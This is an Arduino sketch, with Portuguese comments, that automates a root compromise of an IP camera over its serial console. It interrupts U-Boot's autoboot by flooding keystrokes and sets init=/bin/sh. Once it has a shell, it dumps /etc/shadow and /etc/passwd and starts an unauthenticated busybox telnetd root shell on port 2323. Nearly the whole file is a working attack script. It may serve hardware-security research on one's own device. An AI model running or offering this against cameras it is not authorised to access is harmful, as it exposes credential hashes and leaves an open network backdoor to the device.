// ================================================
// CAMERA HACKER v6 - Reactive (Arduino Sketch)
// Detecta "autoboot" no stream e reage IMEDIATO
// ================================================
// Camera TX  -> Arduino pin 0 (hardware Serial RX)
// Camera RX  -> resistor -> Arduino pin 2 (SoftwareSerial TX)
// Camera GND -> Arduino GND
//
// SoftwareSerial TX no pino 2 JA PROVOU FUNCIONAR
// (camera respondeu com Password: em testes anteriores)

#include <SoftwareSerial.h>

#define CAM_TX_PIN 2

// SoftwareSerial: RX=3 (nao usado), TX=2
SoftwareSerial camTx(3, CAM_TX_PIN);

// Ring buffer pra detectar strings
#define RING_SIZE 64
char ring[RING_SIZE];
uint8_t ringIdx = 0;

void ringPush(char c) {
  ring[ringIdx % RING_SIZE] = c;
  ringIdx++;
}

bool ringHas(const char* needle) {
  uint8_t nlen = strlen(needle);
  if (nlen > RING_SIZE) return false;
  for (uint8_t i = 0; i < RING_SIZE; i++) {
    bool ok = true;
    for (uint8_t j = 0; j < nlen; j++) {
      if (ring[(i + j) % RING_SIZE] != needle[j]) {
        ok = false;
        break;
      }
    }
    if (ok) return true;
  }
  return false;
}

// Estados
enum State {
  WAITING_BOOT,    // esperando camera ligar
  WAITING_UBOOT,   // recebendo dados, esperando "autoboot"
  FLOODING,         // mandando chars pra parar autoboot
  UBOOT_SHELL,     // pegou prompt, mandando comandos
  BRIDGE            // modo bridge interativo
};

State state = WAITING_BOOT;
unsigned long floodStart = 0;
uint8_t cmdPhase = 0;
unsigned long cmdTimer = 0;
bool ubootCaught = false;

void setup() {
  // CRITICO: Pin 2 HIGH imediatamente
  pinMode(CAM_TX_PIN, OUTPUT);
  digitalWrite(CAM_TX_PIN, HIGH);

  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);

  memset(ring, 0, RING_SIZE);

  Serial.println(F(""));
  Serial.println(F("=== CAMERA HACKER v6 - Reactive ==="));
  Serial.println(F(">>> LIGA A CAMERA! <<<"));
  Serial.println(F("Esperando boot..."));

  // Pisca LED enquanto espera
  state = WAITING_BOOT;
}

void sendChar(char c) {
  camTx.write(c);
}

void sendStr(const char* s) {
  while (*s) {
    camTx.write(*s++);
    // Micro delay entre chars
    delayMicroseconds(200);
  }
}

void sendLine(const char* s) {
  sendStr(s);
  camTx.write('\r');
}

void loop() {
  switch (state) {

    case WAITING_BOOT: {
      // Pisca LED
      static unsigned long lastBlink = 0;
      if (millis() - lastBlink > 200) {
        digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
        lastBlink = millis();
      }
      // Checa se chegou dados
      if (Serial.available()) {
        state = WAITING_UBOOT;
        Serial.println(F("\n>>> Boot detectado! <<<"));
        camTx.begin(115200);
        digitalWrite(LED_BUILTIN, HIGH);
      }
      break;
    }

    case WAITING_UBOOT: {
      // Le dados e encaminha pro PC
      while (Serial.available()) {
        char c = Serial.read();
        Serial.write(c);
        ringPush(c);
      }

      // Detecta "autoboot" ou "Hit any"
      if (ringHas("autob") || ringHas("Hit a")) {
        state = FLOODING;
        floodStart = millis();
        Serial.println(F("\n>>> AUTOBOOT! FLOODING! <<<"));
      }
      break;
    }

    case FLOODING: {
      // MANDA CHARS SEM PARAR por 5 segundos
      // Espaco + Enter alternados
      camTx.write(' ');
      camTx.write('\r');

      // Le e mostra output
      while (Serial.available()) {
        char c = Serial.read();
        Serial.write(c);
        ringPush(c);
      }

      // Checa se pegou prompt do U-Boot
      if (ringHas("anyka#") || ringHas("AK#") ||
          ringHas("=> ") || ringHas("ak#")) {
        ubootCaught = true;
        state = UBOOT_SHELL;
        cmdPhase = 0;
        cmdTimer = millis();
        Serial.println(F("\n"));
        Serial.println(F("!!! U-BOOT HACKEADO !!!"));
        break;
      }

      // Timeout flood: 5 segundos
      if (millis() - floodStart > 5000) {
        // Nao pegou prompt mas tenta comandos mesmo assim
        state = UBOOT_SHELL;
        cmdPhase = 0;
        cmdTimer = millis();
        Serial.println(F("\n>>> Flood timeout, tentando comandos... <<<"));
      }

      // Delay minimo entre chars (nao travar o loop)
      delay(2);
      break;
    }

    case UBOOT_SHELL: {
      // Le e mostra output
      while (Serial.available()) {
        char c = Serial.read();
        Serial.write(c);
        ringPush(c);
      }

      // Sequencia de comandos com delays
      if (millis() - cmdTimer > 0) {
        switch (cmdPhase) {
          case 0:
            Serial.println(F("\n[CMD] printenv bootargs"));
            sendLine("printenv bootargs");
            cmdTimer = millis() + 1500;
            cmdPhase++;
            break;

          case 1:
            if (millis() > cmdTimer) {
              Serial.println(F("[CMD] setenv bootdelay 10"));
              sendLine("setenv bootdelay 10");
              cmdTimer = millis() + 500;
              cmdPhase++;
            }
            break;

          case 2:
            if (millis() > cmdTimer) {
              Serial.println(F("[CMD] saveenv"));
              sendLine("saveenv");
              cmdTimer = millis() + 2000;
              cmdPhase++;
            }
            break;

          case 3:
            if (millis() > cmdTimer) {
              Serial.println(F("[CMD] setenv bootargs init=/bin/sh"));
              sendLine("setenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock5 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M");
              cmdTimer = millis() + 500;
              cmdPhase++;
            }
            break;

          case 4:
            if (millis() > cmdTimer) {
              Serial.println(F("[CMD] boot"));
              sendLine("boot");
              cmdTimer = millis() + 8000;
              cmdPhase++;
            }
            break;

          case 5:
            if (millis() > cmdTimer) {
              // Shell root - explora
              Serial.println(F("\n>>> Shell root <<<"));
              sendLine("");
              cmdTimer = millis() + 500;
              cmdPhase++;
            }
            break;

          case 6:
            if (millis() > cmdTimer) {
              sendLine("id");
              cmdTimer = millis() + 500;
              cmdPhase++;
            }
            break;

          case 7:
            if (millis() > cmdTimer) {
              sendLine("cat /etc/shadow");
              cmdTimer = millis() + 500;
              cmdPhase++;
            }
            break;

          case 8:
            if (millis() > cmdTimer) {
              sendLine("cat /etc/passwd");
              cmdTimer = millis() + 500;
              cmdPhase++;
            }
            break;

          case 9:
            if (millis() > cmdTimer) {
              sendLine("ifconfig");
              cmdTimer = millis() + 500;
              cmdPhase++;
            }
            break;

          case 10:
            if (millis() > cmdTimer) {
              sendLine("busybox telnetd -l /bin/sh -p 2323");
              cmdTimer = millis() + 500;
              cmdPhase++;
            }
            break;

          case 11:
            if (millis() > cmdTimer) {
              sendLine("cat /proc/mtd");
              cmdTimer = millis() + 500;
              cmdPhase++;
            }
            break;

          case 12:
            if (millis() > cmdTimer) {
              Serial.println(F("\n=== DONE - BRIDGE MODE ==="));
              state = BRIDGE;
            }
            break;
        }
      }
      break;
    }

    case BRIDGE: {
      // Camera -> PC
      while (Serial.available()) {
        Serial.write(Serial.read());
      }
      // LED pisca lento = bridge mode
      static unsigned long lastB = 0;
      if (millis() - lastB > 1000) {
        digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
        lastB = millis();
      }
      break;
    }
  }
}
